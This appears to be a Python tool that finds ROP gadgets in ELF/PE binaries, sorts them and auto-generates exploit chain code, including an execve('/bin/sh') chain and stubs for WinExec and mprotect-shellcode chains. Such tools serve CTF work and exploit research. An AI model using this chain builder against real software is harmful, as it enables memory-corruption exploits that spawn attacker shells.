#!/usr/bin/env python3
"""rop_finder.py — ROP Gadget 搜索与利用链自动构建

从二进制文件中搜索 ROP gadgets，支持正则过滤和自动 ROP 链构建。

Usage:
    python rop_finder.py <binary> [--depth 5] [--bad-chars "00|0a"] [--arch x64]
    python rop_finder.py <binary> --find "pop rdi"
    python rop_finder.py <binary> --build-chain execve --base 0x400000
"""

from __future__ import annotations

import argparse
import json
import os
import re
import struct
import sys
from collections import defaultdict
from pathlib import Path


# ── Architecture definitions ──────────────────────────────────────────────────

RET_OPCODES = {
    "x86": [b"\xc3", b"\xc2", b"\xca"],  # ret, ret N, retf
    "x64": [b"\xc3", b"\xc2"],            # ret, ret N
}

REGISTERS_X86 = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"]
REGISTERS_X64 = ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rbp", "rsp",
                  "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]

GADGET_CATEGORIES = {
    "pop": {
        "pattern": r"^(pop\s+(?P<reg>\w+))(?:\s*;\s*ret)",
        "description": "Load register from stack",
        "priority": 10,
    },
    "syscall": {
        "pattern": r"(\b|; )(syscall|int\s+0x80)(?:\s*;\s*ret)",
        "description": "System call execution",
        "priority": 9,
    },
    "load_arg": {
        "pattern": r"^(pop\s+rdi|pop\s+rsi|pop\s+rdx|pop\s+rcx|pop\s+r8|pop\s+r9)",
        "description": "Load function argument from stack",
        "priority": 10,
    },
    "mov_store": {
        "pattern": r"^(mov\s+\[\w+\],\s*\w+)(?:\s*;\s*ret)",
        "description": "Write-what-where (memory write)",
        "priority": 8,
    },
    "mov_load": {
        "pattern": r"^(mov\s+\w+,\s*\[\w+\])(?:\s*;\s*ret)",
        "description": "Read from memory (info leak)",
        "priority": 7,
    },
    "xchg": {
        "pattern": r"^(xchg\s+(?P<r1>\w+),\s*(?P<r2>\w+))(?:\s*;\s*ret)",
        "description": "Register swap (stack pivot potential)",
        "priority": 6,
    },
    "stack_pivot": {
        "pattern": r"^(xchg\s+(r?[a-z]+),\s*([re]sp)|leave|xchg\s+([re]sp),\s*\w+)",
        "description": "Stack pivot gadget",
        "priority": 9,
    },
    "zero_reg": {
        "pattern": r"^(xor\s+(?P<reg>\w+),\s*(?P=reg))(?:\s*;\s*ret)",
        "description": "Zero a register",
        "priority": 5,
    },
    "inc_dec": {
        "pattern": r"^(inc|dec)\s+\w+(?:\s*;\s*ret)",
        "description": "Increment/decrement register",
        "priority": 3,
    },
    "add_sub": {
        "pattern": r"^(add|sub)\s+([re]sp),\s*\w+(?:\s*;\s*ret)",
        "description": "Stack adjustment",
        "priority": 4,
    },
}


# ── Utility ───────────────────────────────────────────────────────────────────

def read_binary(path: str) -> bytes | None:
    try:
        with open(path, "rb") as f:
            return f.read()
    except (FileNotFoundError, PermissionError, OSError) as e:
        print(f"Error reading {path}: {e}", file=sys.stderr)
        return None


def detect_arch(data: bytes, path: str) -> str:
    """Detect architecture from binary headers."""
    if len(data) < 20:
        return "x64"

    # ELF
    if data[:4] == b"\x7fELF":
        return "x64" if data[4] == 2 else "x86"

    # PE
    if data[:2] == b"MZ":
        pe_offset = struct.unpack_from("<I", data, 0x3C)[0] if len(data) > 0x3E else 0
        if pe_offset and len(data) > pe_offset + 24:
            machine = struct.unpack_from("<H", data, pe_offset + 4)[0]
            return {0x8664: "x64", 0x14C: "x86", 0xAA64: "arm64",
                    0x1C0: "arm", 0x1C4: "arm"}.get(machine, "x64")

    return "x64"


def extract_executable_sections(data: bytes, arch: str) -> list[tuple[int, bytes]]:
    """Find executable code sections for gadget scanning."""
    sections = []

    # PE
    if data[:2] == b"MZ":
        pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
        if pe_offset < len(data) - 4 and struct.unpack_from("<I", data, pe_offset)[0] == 0x4550:
            file_header = pe_offset + 4
            num_sections = struct.unpack_from("<H", data, file_header + 2)[0]
            opt_header_size = struct.unpack_from("<H", data, file_header + 16)[0]
            section_start = file_header + 20 + opt_header_size
            for i in range(num_sections):
                sec = data[section_start + i*40:section_start + (i+1)*40]
                flags = struct.unpack_from("<I", sec, 36)[0]
                if flags & 0x20000000:  # IMAGE_SCN_MEM_EXECUTE
                    roffset = struct.unpack_from("<I", sec, 20)[0]
                    rsize = struct.unpack_from("<I", sec, 16)[0]
                    vaddr = struct.unpack_from("<I", sec, 12)[0]
                    sec_data = data[roffset:roffset + min(rsize, len(data) - roffset)]
                    sections.append((vaddr, sec_data))

    # ELF
    elif data[:4] == b"\x7fELF":
        is_64 = data[4] == 2
        if is_64 and len(data) > 64:
            phoff = struct.unpack_from("<Q", data, 32)[0]
            phentsize = struct.unpack_from("<H", data, 54)[0]
            phnum = struct.unpack_from("<H", data, 56)[0]
        elif not is_64 and len(data) > 52:
            phoff = struct.unpack_from("<I", data, 28)[0]
            phentsize = struct.unpack_from("<H", data, 42)[0]
            phnum = struct.unpack_from("<H", data, 44)[0]
        else:
            phoff = 0
            phnum = 0
            phentsize = 0

        for i in range(min(phnum, 20)):
            poff = phoff + i * phentsize
            if poff + phentsize > len(data):
                break
            p_type = struct.unpack_from("<I", data, poff)[0]
            if p_type == 1:  # PT_LOAD
                if is_64:
                    p_flags = struct.unpack_from("<I", data, poff + 4)[0]
                    p_offset = struct.unpack_from("<Q", data, poff + 8)[0]
                    p_filesz = struct.unpack_from("<Q", data, poff + 32)[0]
                    p_vaddr = struct.unpack_from("<Q", data, poff + 16)[0]
                else:
                    # ELF32: p_flags at offset 24, p_offset at 4, p_vaddr at 8
                    p_flags = struct.unpack_from("<I", data, poff + 24)[0]
                    p_offset = struct.unpack_from("<I", data, poff + 4)[0]
                    p_filesz = struct.unpack_from("<I", data, poff + 16)[0]
                    p_vaddr = struct.unpack_from("<I", data, poff + 8)[0]
                # PF_X = 1 (executable)
                if p_flags & 1:
                    sec_data = data[p_offset:p_offset + min(p_filesz, len(data) - p_offset)]
                    sections.append((p_vaddr, sec_data))

    # Fallback: use entire .text-like regions
    if not sections:
        # Scan entire binary as a last resort
        sections = [(0x400000, data)]

    return sections


# ── Gadget search ─────────────────────────────────────────────────────────────

def find_gadgets(data: bytes, vaddr: int, arch: str, depth: int = 5,
                 bad_chars: set[int] | None = None) -> list[dict]:
    """Find ROP gadgets ending in 'ret' instruction."""
    if bad_chars is None:
        bad_chars = set()

    ret_opcodes = RET_OPCODES.get(arch, [b"\xc3"])

    gadgets = []
    offset = 0
    while offset < len(data) - 2:
        # Find next ret instruction
        ret_idx = -1
        for ret_op in ret_opcodes:
            pos = data.find(ret_op, offset)
            if pos != -1 and (ret_idx == -1 or pos < ret_idx):
                ret_idx = pos

        if ret_idx == -1:
            break

        # Check for null bytes in the address
        addr = vaddr + ret_idx
        addr_bytes = struct.pack("<I" if arch == "x86" else "<Q", addr)
        if any(b in bad_chars for b in addr_bytes):
            offset = ret_idx + 1
            continue

        # Extract gadget: go back up to `depth` instructions
        for length in range(1, depth + 1):
            start = max(0, ret_idx - length * 8)  # 8 bytes per instruction max
            gadget_bytes = data[start:ret_idx + len(ret_opcodes[0])]

            # Skip if contains bad chars
            if any(b in bad_chars for b in gadget_bytes):
                continue

            gadgets.append({
                "offset": start,
                "vaddr": vaddr + start,
                "vaddr_hex": hex(vaddr + start),
                "bytes": gadget_bytes.hex(),
                "size": len(gadget_bytes),
            })

        offset = ret_idx + len(ret_opcodes[0])

    return gadgets


# ── Gadget categorization ─────────────────────────────────────────────────────

def categorize_gadgets(gadgets: list[dict], arch: str) -> dict[str, list[dict]]:
    """Disassemble gadgets and categorize them."""
    try:
        import capstone
    except ImportError:
        return {"uncategorized": gadgets}

    if arch == "x64":
        cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    else:
        cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
    cs.detail = True

    categorized = defaultdict(list)

    for g in gadgets:
        # Disassemble gadget
        gbytes = bytes.fromhex(g["bytes"])
        insns = list(cs.disasm(gbytes, g["vaddr"]))
        if not insns:
            continue

        # Build text representation
        insn_texts = []
        for insn in insns:
            insn_texts.append(f"{insn.mnemonic} {insn.op_str}".strip())

        # The last instruction should be ret, syscall, or int (control-flow terminators)
        last_insn = insn_texts[-1]
        if not (last_insn.startswith("ret") or last_insn.startswith("int")
                or last_insn.startswith("syscall") or last_insn.startswith("sysenter")):
            continue

        text_joined = " ; ".join(insn_texts)
        g["text"] = text_joined
        g["instructions"] = insn_texts
        g["insn_count"] = len(insn_texts)

        # Categorize
        for cat, info in GADGET_CATEGORIES.items():
            if re.search(info["pattern"], text_joined, re.IGNORECASE):
                g["category"] = cat
                g["priority"] = info["priority"]
                categorized[cat].append(g)
                break
        else:
            g["category"] = "other"
            g["priority"] = 1
            categorized["other"].append(g)

    # Sort each category by priority and gadget size
    for cat in categorized:
        categorized[cat].sort(key=lambda x: (-x.get("priority", 0), x.get("insn_count", 99)))

    return dict(categorized)


# ── ROP chain building ────────────────────────────────────────────────────────

def build_rop_chain(categorized: dict, arch: str, target: str, base_addr: int = 0):
    """Attempt to auto-build a ROP chain for common targets."""
    all_gadgets = []
    for cat_gadgets in categorized.values():
        all_gadgets.extend(cat_gadgets)

    lines = []
    lines.append(f"# ROP chain for: {target}")
    lines.append(f"# Architecture: {arch}")
    lines.append(f"# Total gadgets available: {len(all_gadgets)}")
    lines.append("")

    if target == "execve":
        lines.extend(_build_execve_chain(categorized, arch, base_addr))
    elif target in ("calc", "WinExec"):
        lines.extend(_build_winexec_chain(categorized, arch, base_addr))
    elif target == "memprotect":
        lines.extend(_build_memprotect_chain(categorized, arch, base_addr))
    else:
        # Show available key gadgets
        lines.append("# Key gadgets for manual chain construction:")
        for cat, info in GADGET_CATEGORIES.items():
            if cat in categorized and categorized[cat]:
                lines.append(f"# {cat} ({info['description']}): {len(categorized[cat])} found")
                for g in categorized[cat][:3]:
                    lines.append(f"#   {g['vaddr_hex']}: {g.get('text', g['bytes'])}")

    return "\n".join(lines)


def _build_execve_chain(categorized: dict, arch: str, base_addr: int) -> list[str]:
    """Build execve('/bin/sh', NULL, NULL) ROP chain."""
    lines = []
    lines.append("## execve('/bin/sh', NULL, NULL)")
    lines.append("")

    if arch == "x64":
        lines.append("# Required: pop rdi; ret, pop rsi; ret, pop rdx; ret, syscall; ret")
        lines.append("# Optional: /bin/sh string in binary (use info leak or write to .bss)")
        lines.append("")

        pop_rdi = _first_gadget(categorized, "pop", "rdi")
        pop_rsi = _first_gadget(categorized, "pop", "rsi")
        pop_rdx = _first_gadget(categorized, "pop", "rdx")
        pop_rax = _first_gadget(categorized, "pop", "rax")
        syscall = _first_in_category(categorized, "syscall")

        # Also check "load_arg" category
        if not pop_rdi:
            for g in categorized.get("load_arg", []):
                if "rdi" in g.get("text", ""):
                    pop_rdi = g
                    break
        if not pop_rsi:
            for g in categorized.get("load_arg", []):
                if "rsi" in g.get("text", ""):
                    pop_rsi = g
                    break

        lines.append("from struct import pack")
        lines.append("")
        lines.append("p64 = lambda x: pack('<Q', x)")
        lines.append("")
        lines.append("chain = b''")

        if pop_rdi:
            lines.append(f"chain += p64({pop_rdi['vaddr_hex']})  # pop rdi; ret")
        else:
            lines.append("# !! Missing: pop rdi; ret gadget")

        lines.append("# chain += p64(bin_sh_addr)  # address of '/bin/sh' string")
        lines.append("chain += p64(0x0)  # PLACEHOLDER: put /bin/sh address here")

        if pop_rsi:
            lines.append(f"chain += p64({pop_rsi['vaddr_hex']})  # pop rsi; ret")
        else:
            lines.append("# !! Missing: pop rsi; ret gadget")
        lines.append("chain += p64(0x0)  # argv = NULL")

        if pop_rdx:
            lines.append(f"chain += p64({pop_rdx['vaddr_hex']})  # pop rdx; ret")
        else:
            lines.append("# !! Missing: pop rdx; ret gadget")
        lines.append("chain += p64(0x0)  # envp = NULL")

        if pop_rax:
            lines.append(f"chain += p64({pop_rax['vaddr_hex']})  # pop rax; ret")
            lines.append("chain += p64(59)  # __NR_execve")
        else:
            lines.append("# !! Missing: pop rax; ret gadget")

        if syscall:
            lines.append(f"chain += p64({syscall['vaddr_hex']})  # syscall; ret")
        else:
            lines.append("# !! Missing: syscall; ret gadget")

    else:
        lines.append("# x86 execve chain: use int 0x80 after setting eax=11, ebx=/bin/sh, ecx=0, edx=0")

    return lines


def _build_winexec_chain(categorized: dict, arch: str, base_addr: int) -> list[str]:
    """Build Windows WinExec / CreateProcess chain."""
    lines = []
    lines.append("## WinExec / CreateProcess (Windows)")
    lines.append("")
    lines.append("# Windows x64 calling convention: rcx, rdx, r8, r9 + shadow space (0x20 bytes)")
    lines.append("# Required: pop rcx; ret + pop rdx; ret + address of WinExec IAT entry")
    lines.append("# Requires knowing: WinExec IAT address, 'calc.exe' string address")
    return lines


def _build_memprotect_chain(categorized: dict, arch: str, base_addr: int) -> list[str]:
    """Build mprotect ROP chain to make memory executable for shellcode."""
    lines = []
    lines.append("## mprotect(addr, len, PROT_READ|PROT_WRITE|PROT_EXEC)")
    lines.append("")
    lines.append("# After mprotect, jump to shellcode at addr")
    return lines


def _first_gadget(categorized: dict, category: str, register: str) -> dict | None:
    """Find first gadget in category containing a specific register."""
    for cat_name in [category, "load_arg"]:
        for g in categorized.get(cat_name, []):
            if register in g.get("text", ""):
                return g
    # Search all categories
    for _cat_name, gadgets in categorized.items():
        for g in gadgets:
            if register in g.get("text", "") and "pop" in g.get("text", ""):
                return g
    return None


def _first_in_category(categorized: dict, category: str) -> dict | None:
    gadgets = categorized.get(category, [])
    return gadgets[0] if gadgets else None


def _find_ret(categorized: dict) -> dict | None:
    for cat_gadgets in categorized.values():
        for g in cat_gadgets:
            if g.get("text", "").strip() == "ret":
                return g
    return None


# ── Output ────────────────────────────────────────────────────────────────────

def print_gadgets(categorized: dict, max_per_category: int = 10):
    """Print gadget summary to stdout."""
    for cat, info in GADGET_CATEGORIES.items():
        gadgets = categorized.get(cat, [])
        if not gadgets:
            continue
        print(f"\n{'='*60}")
        print(f" {cat.upper()} — {info['description']} ({len(gadgets)} found)")
        print(f"{'='*60}")
        for g in gadgets[:max_per_category]:
            text = g.get("text", g["bytes"])
            print(f"  {g['vaddr_hex']:<14} {text}")


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="rop_finder — ROP gadget finder and chain builder")
    parser.add_argument("binary", help="Path to the binary")
    parser.add_argument("--depth", type=int, default=5,
                        help="Max instructions to look back from ret (default: 5)")
    parser.add_argument("--bad-chars", default="00",
                        help="Bad characters, pipe-separated hex (e.g., '00|0a|0d')")
    parser.add_argument("--arch", choices=["x86", "x64"],
                        help="Architecture (auto-detect if not specified)")
    parser.add_argument("--find", help="Find specific gadget (e.g., 'pop rdi')")
    parser.add_argument("--build-chain", metavar="TARGET",
                        choices=["execve", "calc", "memprotect"],
                        help="Attempt to build ROP chain for target")
    parser.add_argument("--base", default="0x0", help="Address offset for gadgets")
    parser.add_argument("--max-per-category", type=int, default=10,
                        help="Max gadgets to show per category")
    parser.add_argument("--out", "-o", help="Save gadget list to file")
    parser.add_argument("--json", action="store_true", help="Output JSON")

    args = parser.parse_args()

    if not os.path.exists(args.binary):
        print(f"Error: file not found: {args.binary}", file=sys.stderr)
        sys.exit(1)

    data = read_binary(args.binary)
    if data is None or len(data) < 10:
        print("Error: cannot read binary", file=sys.stderr)
        sys.exit(1)

    arch = args.arch or detect_arch(data, args.binary)
    bad_chars = set(int(bc, 16) for bc in args.bad_chars.split("|") if bc)
    base_offset = int(args.base, 16)

    print(f"[*] Binary: {Path(args.binary).name} ({len(data):,} bytes)")
    print(f"[*] Architecture: {arch}")
    print(f"[*] Bad chars: {', '.join(f'0x{bc:02x}' for bc in sorted(bad_chars))}")

    # Find executable sections
    sections = extract_executable_sections(data, arch)
    print(f"[*] Found {len(sections)} executable section(s)")

    if not sections:
        print("Warning: no executable sections found, scanning whole file")

    # Search for gadgets
    all_gadgets = []
    for vaddr, sec_data in sections:
        gadgets = find_gadgets(sec_data, vaddr + base_offset, arch, args.depth, bad_chars)
        all_gadgets.extend(gadgets)

    print(f"[*] Found {len(all_gadgets)} raw gadgets ending in 'ret'")

    # Categorize
    categorized = categorize_gadgets(all_gadgets, arch)
    total_cat = sum(len(v) for v in categorized.values())
    print(f"[*] Categorized {total_cat} gadgets")
    for cat, gadgets in sorted(categorized.items()):
        print(f"    {cat}: {len(gadgets)}")

    # Build chain if requested
    if args.build_chain:
        chain = build_rop_chain(categorized, arch, args.build_chain)
        print(chain)

    # Search for specific gadget
    if args.find:
        search = args.find.lower()
        print(f"\n[*] Searching for: '{args.find}'")
        found = []
        for cat_gadgets in categorized.values():
            for g in cat_gadgets:
                if search in g.get("text", "").lower():
                    found.append(g)
        if found:
            for g in found[:20]:
                print(f"  {g['vaddr_hex']:<14} {g.get('text', g['bytes'])}")
        else:
            print("  No matching gadgets found.")

    # Print summary
    if not args.build_chain:
        print_gadgets(categorized, args.max_per_category)

    # Save to file
    if args.out:
        with open(args.out, "w") as f:
            for cat, gadgets in sorted(categorized.items()):
                f.write(f"\n{'='*60}\n")
                f.write(f" {cat.upper()} ({len(gadgets)} found)\n")
                f.write(f"{'='*60}\n")
                for g in gadgets:
                    f.write(f"  {g['vaddr_hex']:<14} {g.get('text', g['bytes'])}\n")
        print(f"\n[+] Saved to {args.out}")

    if args.json:
        export = {cat: [{"vaddr": g["vaddr_hex"], "text": g.get("text", g["bytes"])}
                        for g in gadgets[:args.max_per_category]]
                  for cat, gadgets in sorted(categorized.items())}
        print(json.dumps(export, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
